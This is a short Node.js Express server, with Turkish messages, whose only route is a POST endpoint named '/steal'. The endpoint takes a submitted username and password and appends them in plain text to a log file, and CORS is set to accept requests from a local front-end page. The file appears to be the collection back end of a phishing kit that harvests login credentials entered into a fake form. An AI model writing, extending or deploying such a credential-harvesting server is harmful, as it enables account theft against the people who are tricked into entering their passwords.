const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

app.use(cors({
    origin: "http://127.0.0.1:5500"
}));
app.use(express.json());

app.post("/steal", (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send("Eksik veri");
    }

    const log = `Kullanıcı Adı: ${username} | Şifre: ${password}\n`;

    // log.txt dosyasına ekle
    fs.appendFile("log.txt", log, (err) => {
        if (err) {
            console.error("Dosyaya yazılamadı:", err);
            return res.status(500).send("Sunucu hatası");
        }
        console.log("Veri log.txt dosyasına yazıldı.");
        res.sendStatus(200);
    });
});

app.listen(3000, () => {
    console.log("Sunucu çalışıyor http://localhost:3000");
});
